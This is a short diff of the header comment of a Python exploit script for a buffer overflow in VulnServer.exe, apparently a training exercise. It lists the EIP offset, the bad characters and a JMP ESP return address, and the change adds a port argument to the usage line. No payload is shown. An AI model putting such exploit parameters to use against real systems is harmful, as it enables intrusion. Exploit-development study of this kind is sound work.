@@ -8,7 +8,7 @@
 # EIP Offset    = 2006                                                                        #
 # Badchars      = \x00                                                                        #
 # RET Address   = 0x655011af : "\xFF\xE4" | [VulnServer.exe]                                  #
-# Usage         = python exploit.py <target IP>                                               #        
+# Usage         = python exploit.py <target IP> <port>                                        #        
 #---------------------------------------------------------------------------------------------#
 
 import socket as so
